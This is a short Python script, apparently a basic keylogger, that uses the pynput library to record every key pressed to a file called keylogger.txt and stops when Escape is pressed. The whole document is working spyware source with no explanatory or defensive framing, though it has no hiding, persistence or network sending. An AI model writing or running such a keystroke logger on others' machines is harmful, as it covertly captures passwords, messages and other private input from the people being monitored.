import logging
from pynput.keyboard import Key, Listener

logging.basicConfig(filename= 'keylogger.txt', level= logging.DEBUG)

def pressed(key):
    logging.info(str(key))

def release(key):
    if key == Key.esc:
        return False

with Listener (on_press = pressed, on_release = release) as listener:
    listener.join()